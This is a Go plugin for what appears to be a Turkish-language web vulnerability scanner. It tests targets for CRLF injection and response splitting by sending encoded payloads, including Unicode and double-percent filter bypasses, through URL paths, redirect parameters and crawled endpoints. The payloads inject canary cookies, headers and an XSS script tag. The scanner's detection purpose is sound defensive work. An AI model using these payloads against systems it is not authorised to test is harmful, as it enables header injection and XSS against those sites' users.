package plugins

import (
	"DORM/models"
	"fmt"
	"net/url"
	"strings"
)

// ==================================================
// CRLF INJECTION — v2.0 "Header Hijack"
// 6 encoding varyantı · XSS escalation
// Response splitting kanıtı · Spider entegrasyonu
// ==================================================
type CRLFPlugin struct{}

func (p *CRLFPlugin) Name() string { return "CRLF Injection (Header Hijack v2)" }

func (p *CRLFPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	// ── CRLF encoding varyantları ────────────────────────────────────────
	type CRLFVariant struct {
		Encoded string // URL'e gömülecek hâl
		Name    string
	}

	// Her varyant: Set-Cookie header injection kanıtı
	headerCanary := "X-DORM-Injected"
	cookieCanary := "DORM_CRLF_PWN"

	crlfs := []CRLFVariant{
		{"%0d%0a", "Standard (%0d%0a)"},
		{"%0D%0A", "Uppercase (%0D%0A)"},
		{"%E5%98%8D%E5%98%8A", "Unicode Multi-Byte Bypass"},
		{"%u000d%u000a", "IIS Unicode Bypass"},
		{"%23%0d%0a", "Hash Prefix Bypass"},
		{"%%0d%%0a", "Double Percent Bypass"},
	}

	// ── Injection noktaları ──────────────────────────────────────────────
	// 1. URL path — doğrudan path'e gömme
	// 2. Redirect/open-redirect parametreleri
	redirectParams := []string{"redirect", "url", "next", "return", "dest", "target", "redir", "goto", "r", "u"}

	// ── Injection string'leri ────────────────────────────────────────────
	buildPathPayload := func(crlf string) string {
		// /path\r\nSet-Cookie: DORM_CRLF_PWN=1
		return fmt.Sprintf("/%sSet-Cookie: %s=1", crlf, cookieCanary)
	}

	buildParamPayload := func(crlf string) string {
		// http://example.com\r\nSet-Cookie: DORM_CRLF_PWN=1
		return fmt.Sprintf("http://example.com%sSet-Cookie: %s=1", crlf, cookieCanary)
	}

	buildXSSPayload := func(crlf string) string {
		// \r\nContent-Type: text/html\r\n\r\n<script>alert('DORM_XSS')</script>
		return fmt.Sprintf("/%sContent-Type: text/html%s%s<script>alert('DORM_XSS_CRLF')</script>", crlf, crlf, crlf)
	}

	buildHeaderPayload := func(crlf string) string {
		return fmt.Sprintf("/%s%s: dorm_injected", crlf, headerCanary)
	}

	checkCookie := func(resp interface{ Header() map[string][]string }) bool {
		// Helper: Set-Cookie header'ında canary var mı?
		return false // interface trick yerine doğrudan net/http.Response kullanıyoruz
	}
	_ = checkCookie

	// ── FAZA 1: URL Path Injection ───────────────────────────────────────
	for _, variant := range crlfs {
		// Response splitting — Set-Cookie kanıtı
		pathPayload := buildPathPayload(variant.Encoded)
		resp, err := client.Get(baseURL + pathPayload)
		if err == nil {
			defer resp.Body.Close()
			setCookie := resp.Header.Get("Set-Cookie")
			if strings.Contains(setCookie, cookieCanary) {
				return &models.Vulnerability{
					Target:   target,
					Name:     "CRLF Injection (Response Splitting)",
					Severity: "MEDIUM",
					CVSS:     6.5,
					Description: fmt.Sprintf(
						"CRLF injection ile HTTP response splitting doğrulandı.\nEncoding: %s\nPayload: %s\nKanıt: Set-Cookie header'ında '%s' bulundu.",
						variant.Name, pathPayload, cookieCanary,
					),
					Solution:  "Kullanıcı girdilerindeki \\r\\n karakterlerini encode edin veya filtreleyin.",
					Reference: "CWE-113: HTTP Response Splitting",
				}
			}

			// Custom header kanıtı
			if resp.Header.Get(headerCanary) != "" {
				return &models.Vulnerability{
					Target:   target,
					Name:     fmt.Sprintf("CRLF Injection (Header Injection — %s)", variant.Name),
					Severity: "MEDIUM",
					CVSS:     6.8,
					Description: fmt.Sprintf(
						"Özel header enjekte edildi.\nEncoding: %s\nInjected Header: '%s: dorm_injected'",
						variant.Name, headerCanary,
					),
					Solution:  "\\r\\n karakterlerini filtreleyin veya encode edin.",
					Reference: "CWE-113: HTTP Response Splitting",
				}
			}
		}

		// XSS escalation payload
		xssPayload := buildXSSPayload(variant.Encoded)
		respXSS, err := client.Get(baseURL + xssPayload)
		if err == nil {
			defer respXSS.Body.Close()
			ct := respXSS.Header.Get("Content-Type")
			if strings.Contains(ct, "text/html") && respXSS.StatusCode == 200 {
				return &models.Vulnerability{
					Target:   target,
					Name:     "CRLF Injection (XSS Escalation via Response Splitting)",
					Severity: "HIGH",
					CVSS:     7.5,
					Description: fmt.Sprintf(
						"CRLF injection ile Content-Type: text/html enjekte edildi — XSS yükselme vektörü doğrulandı.\nEncoding: %s\nPayload: %s",
						variant.Name, xssPayload,
					),
					Solution:  "\\r\\n karakterlerini tüm HTTP header değerlerinde filtreleyin. Content Security Policy (CSP) uygulayın.",
					Reference: "CWE-113 / CWE-79: XSS via CRLF Injection",
				}
			}
		}
	}

	// ── FAZA 2: Redirect Parametre Injection ─────────────────────────────
	for _, param := range redirectParams {
		for _, variant := range crlfs {
			paramPayload := buildParamPayload(variant.Encoded)
			targetURL := fmt.Sprintf("%s/?%s=%s", baseURL, param, url.QueryEscape(paramPayload))

			resp, err := client.Get(targetURL)
			if err != nil {
				continue
			}
			resp.Body.Close()

			setCookie := resp.Header.Get("Set-Cookie")
			location := resp.Header.Get("Location")

			if strings.Contains(setCookie, cookieCanary) {
				return &models.Vulnerability{
					Target:   target,
					Name:     fmt.Sprintf("CRLF Injection (Response Splitting — %s)", variant.Name),
					Severity: "MEDIUM",
					CVSS:     6.5,
					Description: fmt.Sprintf(
						"Redirect parametresi üzerinden CRLF injection doğrulandı.\nParam: %s  Encoding: %s\nPayload: %s\nKanıt: Set-Cookie'de '%s' bulundu.",
						param, variant.Name, paramPayload, cookieCanary,
					),
					Solution:  "Redirect URL'lerini whitelist bazlı doğrulayın ve \\r\\n karakterlerini encode edin.",
					Reference: "CWE-113: HTTP Response Splitting",
				}
			}

			if strings.Contains(location, "\r") || strings.Contains(location, "\n") {
				return &models.Vulnerability{
					Target:   target,
					Name:     fmt.Sprintf("CRLF Injection (Location Header Split — %s)", variant.Name),
					Severity: "MEDIUM",
					CVSS:     6.8,
					Description: fmt.Sprintf(
						"Location header'ı CRLF karakterleri içeriyor — response splitting kanıtlandı.\nParam: %s  Encoding: %s",
						param, variant.Name,
					),
					Solution:  "Redirect URL'lerini doğrulayın ve \\r\\n karakterlerini filtreleyin.",
					Reference: "CWE-113: HTTP Response Splitting",
				}
			}
		}
	}

	// ── FAZA 3: Spider Endpoint Entegrasyonu ─────────────────────────────
	key := "endpoints_" + target.IP
	if existing, ok := models.SharedData.Load(key); ok {
		spiderEndpoints := existing.([]models.Endpoint)
		for _, ep := range spiderEndpoints {
			if ep.Method == "GET" && len(ep.Params) > 0 {
				for _, param := range ep.Params {
					// Redirect parametresi gibi görünüyor mu?
					if !containsAny(strings.ToLower(param), "redirect", "url", "next", "return", "dest", "goto", "r", "u") {
						continue
					}
					for _, variant := range crlfs[:2] { // İlk 2 encoding yeterli
						u, err := url.Parse(ep.URL)
						if err != nil {
							continue
						}
						q := u.Query()
						q.Set(param, buildParamPayload(variant.Encoded))
						u.RawQuery = q.Encode()

						resp, err := client.Get(u.String())
						if err != nil {
							continue
						}
						resp.Body.Close()

						if strings.Contains(resp.Header.Get("Set-Cookie"), cookieCanary) {
							return &models.Vulnerability{
								Target:   target,
								Name:     "CRLF Injection (Spider-Discovered Endpoint)",
								Severity: "MEDIUM",
								CVSS:     6.5,
								Description: fmt.Sprintf(
									"Spider'ın keşfettiği endpoint'te CRLF injection doğrulandı.\nURL: %s\nParam: %s  Encoding: %s",
									ep.URL, param, variant.Name,
								),
								Solution:  "\\r\\n karakterlerini tüm parametrelerde filtreleyin.",
								Reference: "CWE-113: HTTP Response Splitting",
							}
						}
					}
				}
			}
		}
	}

	// ── Son kontrol: standart path payload (header proof) ─────────────────
	for _, variant := range crlfs {
		hdrPayload := buildHeaderPayload(variant.Encoded)
		resp, err := client.Get(baseURL + hdrPayload)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.Header.Get(headerCanary) != "" {
			return &models.Vulnerability{
				Target:   target,
				Name:     fmt.Sprintf("CRLF Injection (Unicode Bypass — %s)", variant.Name),
				Severity: "MEDIUM",
				CVSS:     6.8,
				Description: fmt.Sprintf(
					"Unicode/özel encoding ile CRLF injection atlatması başarılı.\nEncoding: %s\nInjected Header: '%s'",
					variant.Name, headerCanary,
				),
				Solution:  "Tüm encoding varyantlarını (hex, unicode, double-encode) filtreleyin.",
				Reference: "CWE-113: HTTP Response Splitting",
			}
		}
	}

	return nil
}
